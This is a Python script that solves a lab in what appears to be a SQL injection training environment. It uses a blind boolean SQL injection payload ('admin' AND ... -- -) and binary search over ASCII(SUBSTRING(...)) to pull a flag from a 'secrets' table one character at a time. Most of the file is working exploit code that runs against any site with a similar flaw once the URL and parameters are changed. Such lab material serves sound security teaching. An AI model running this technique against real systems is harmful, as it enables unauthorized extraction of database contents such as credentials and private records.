#!/usr/bin/env python3
"""
Lab 9 -- Blind Boolean SQLi: SUBSTRING + Binary Search
=====================================================
Extracts the flag from the 'secrets' table character by character
using a boolean oracle (different responses for TRUE vs FALSE).

Usage:
    python3 lab9_blind_boolean.py [TARGET_URL]

Default target: http://localhost/SQLi-Arena/public/lab.php
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/SQLi-Arena/public/lab.php"
PARAMS_BASE = {"lab": "mysql/lab9", "mode": "black"}

# Boolean oracle markers (check the HTML response)
TRUE_MARKER = "result-data"      # present when the member IS found (active)
FALSE_MARKER = "result-warning"  # present when the member is NOT found


def check(condition):
    """Inject a boolean condition and return True if the oracle says TRUE."""
    payload = f"admin' AND {condition} -- -"
    params = {**PARAMS_BASE, "user": payload}
    r = requests.get(TARGET, params=params)
    return TRUE_MARKER in r.text


def find_length(subquery, max_len=50):
    """Binary-search the length of a subquery result."""
    low, high = 1, max_len
    while low <= high:
        mid = (low + high) // 2
        if check(f"({subquery}) > {mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return low


def extract_char(subquery, pos):
    """Binary-search the ASCII value of character at position pos."""
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        if check(f"ASCII(SUBSTRING(({subquery}),{pos},1)) > {mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low) if 32 <= low <= 126 else "?"


# ── Step 1: Confirm the oracle works ──
print(f"[*] Target: {TARGET}")
print("[*] Confirming boolean oracle...")
if not check("1=1"):
    print("[-] ERROR: TRUE condition not detected. Check TARGET URL and markers.")
    sys.exit(1)
if check("1=2"):
    print("[-] ERROR: FALSE condition returns TRUE. Oracle is broken.")
    sys.exit(1)
print("[+] Boolean oracle confirmed (TRUE=active, FALSE=not found)")

# ── Step 2: Find the flag length ──
SUBQUERY = "SELECT flag_value FROM secrets LIMIT 1"
LENGTH_SUBQUERY = f"SELECT LENGTH(flag_value) FROM secrets LIMIT 1"

print("[*] Finding flag length...")
length = find_length(LENGTH_SUBQUERY)
print(f"[+] Flag length: {length}")

# ── Step 3: Extract character by character with binary search ──
print(f"[*] Extracting flag ({length} chars, ~7 requests each)...")
flag = ""
for pos in range(1, length + 1):
    c = extract_char(SUBQUERY, pos)
    flag += c
    print(f"  [{pos:2d}/{length}] {flag}")

print(f"\n[+] Flag: {flag}")
